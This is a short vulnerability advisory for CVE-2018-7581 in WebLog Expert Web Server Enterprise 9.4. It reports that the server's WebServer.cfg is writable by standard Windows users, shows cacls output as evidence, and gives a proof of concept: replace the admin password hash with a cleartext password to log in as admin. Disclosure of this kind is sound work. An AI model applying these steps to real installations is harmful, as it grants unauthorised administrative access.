Vulnerability Type:
===================
Authentication Bypass



CVE Reference:
==============
CVE-2018-7581



Security Issue:
================
The "WebServer.cfg" under "ProgramData\WebLog Expert\WebServer\" used by WebLog Expert Web Server Enterprise 9.4
has weak permissions (BUILTIN\Users:(ID)C), which allows local users to set a cleartext password and login as admin.

A standard non Windows Administrator user can edit the 'WebServer.cfg' file under "C:\ProgramData\WebLog Expert\WebServer"
set to a cleartext password and login as admin.

e.g.

C:\ProgramData\WebLog Expert\WebServer>cacls * | more
C:\ProgramData\WebLog Expert\WebServer\WebServer.cfg BUILTIN\Users:(ID)C
                                                      BUILTIN\Administrators:(ID)C
                                                      NT AUTHORITY\SYSTEM:(ID)F
                                                      BUILTIN\Administrators:(ID)F


Exploit/POC:
=============
Login as a 'Standard' Windows user
Comment out the Admin hashed password using ';' then add any cleartext password as follows.

[User:admin]
Password=1234
;PasswordHash=3413C538CE5234FB194E82AE1F3954FD2BC848C0
bAllProfiles=1

Now login in as Admin! :)
